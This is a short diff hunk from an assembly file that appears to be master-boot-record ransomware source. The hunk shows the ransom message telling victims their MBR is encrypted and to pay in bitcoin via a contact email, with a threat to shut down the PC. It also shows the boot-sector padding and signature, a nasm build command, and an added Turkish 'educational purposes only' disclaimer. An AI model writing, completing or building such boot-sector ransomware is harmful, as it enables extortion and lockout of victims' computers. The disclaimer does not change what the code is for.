@@ -123,4 +123,5 @@ tuslar db 0
 msg db "your mrb has been encrypted!",10,13,"Your custom serial key is: <serial key>",10,13,"quest: what can i do?",10,13,"answer: when you contact test@test.test then we send address of btc payment. if press esc, pc will shutdown.",10,13,"        - good luck -",10,13,0
 times 510 - ($-$$) db 0
 dw 0xaa55
-;nasm -f bin -o payload.bin mrb-gg.asm
+; nasm -f bin -o payload.bin mrb-gg.asm
+; Tamamen egitim amaclidir. hic bir sorumluluk kabul etmiyorum!
